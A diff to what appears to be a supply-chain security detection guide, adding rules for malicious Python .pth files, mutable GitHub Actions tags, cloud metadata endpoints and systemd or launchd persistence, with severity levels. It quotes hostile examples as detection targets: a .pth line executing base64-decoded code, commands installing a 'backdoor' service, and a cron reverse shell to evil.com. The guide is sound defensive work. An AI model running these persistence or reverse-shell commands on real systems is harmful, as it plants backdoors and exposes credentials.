@@ -133,6 +133,32 @@ install:
 
 Flag any Makefile `install` target that makes network calls: **HIGH**.
 
+### Python `.pth` file persistence
+
+`.pth` files in Python's `site-packages/` directory are loaded and executed automatically on **every Python interpreter startup** — not just when the package is imported. A legitimate `.pth` file contains only directory paths. Any `.pth` containing executable code is a persistence mechanism.
+
+```python
+# Malicious .pth — runs silently on every python invocation after install
+import os, subprocess, sys; subprocess.Popen([sys.executable, "-c",
+    "import base64; exec(base64.b64decode('AAAAAA...'))"])
+```
+
+Flag any `.pth` file containing `import`, `exec`, `subprocess`, `os.`, or semicolons (inline statements): **CRITICAL**.
+
+### GitHub Actions unpinned third-party actions
+
+GitHub allows tag names to be force-pushed to point to a different commit. In the March 2026 LiteLLM attack, `aquasecurity/trivy-action@v0.69.4` was rewritten to execute a credential-stealing payload that stole the PyPI publish token from the runner's environment.
+
+```yaml
+# DANGEROUS — tag is mutable, can be silently rewritten
+uses: aquasecurity/trivy-action@v0.69.4
+
+# SAFE — immutable commit SHA
+uses: aquasecurity/trivy-action@76b2678f01aa2507c2f0e45d1e7285f56d5ab42b
+```
+
+Flag any third-party `uses:` referencing a semver tag (`@v1.2.3`, `@v2`, `@main`) rather than a full commit SHA: **HIGH**. First-party `actions/*` and `github/*` actions use immutable major-version tags internally, but all other orgs should be pinned by SHA.
+
 ### GitHub Actions / CI
 
 ```yaml
@@ -144,7 +170,9 @@ Flag in workflows: **HIGH** (runs in CI with broad credentials).
 
 ### Severity
 - Install hook + network call: **CRITICAL**
+- `.pth` file with executable code: **CRITICAL**
 - Install hook + file write outside project: **HIGH**
+- Unpinned third-party GitHub Action (tag instead of SHA): **HIGH**
 - Install hook exists (any): **MEDIUM** — needs manual review
 
 ---
@@ -176,6 +204,19 @@ HOME/.netrc
 HOME/.config/gcloud/
 /etc/passwd, /etc/shadow
 ```
+
+### Cloud instance metadata endpoints
+
+Querying the instance metadata service (IMDS) is a common technique for harvesting cloud credentials in CI/CD and cloud environments. These endpoints return short-lived IAM credentials, account IDs, and other sensitive cloud identity data.
+
+```
+169.254.169.254          — AWS IMDSv1 (and GCP/Azure share this IP)
+fd00:ec2::254            — AWS IMDSv2 (IPv6)
+metadata.google.internal — GCP metadata server
+metadata.azure.com       — Azure IMDS
+```
+
+Flag any code querying these endpoints: **HIGH** (combined with credential read/post: **CRITICAL**).
 
 ### Patterns to grep
 
@@ -325,16 +366,37 @@ echo "*/5 * * * * root bash -c 'bash -i >& /dev/tcp/evil.com/443 0>&1'" >> /etc/
 
 ### Systemd persistence
 
+System-level (requires root):
 ```bash
 cp backdoor /etc/systemd/system/update.service
 systemctl enable update
 ```
 
+User-level persistence (no root required — used in the March 2026 LiteLLM attack):
+```bash
+mkdir -p ~/.config/systemd/user/
+cp backdoor.service ~/.config/systemd/user/sysmon.service
+systemctl --user enable sysmon
+systemctl --user start sysmon
+```
+
+User-level services survive reboots and run without root. Look for any code writing `.service` files to `~/.config/systemd/`, `/etc/systemd/`, or `/lib/systemd/`, and for `systemctl --user enable` / `systemctl --user start` calls.
+
+### Launchd persistence (macOS)
+
+```bash
+cp backdoor.plist ~/Library/LaunchAgents/com.apple.update.plist
+launchctl load ~/Library/LaunchAgents/com.apple.update.plist
+```
+
+Flag any code writing `.plist` files to `LaunchAgents/` or `LaunchDaemons/`: **HIGH**.
+
 ### Severity
 - sudoers modification: **CRITICAL**
 - Cron injection: **CRITICAL**
 - SUID modification: **HIGH**
-- Systemd unit install: **HIGH**
+- Systemd unit install (system or user level): **HIGH**
+- Launchd plist install: **HIGH**
 
 ---
 
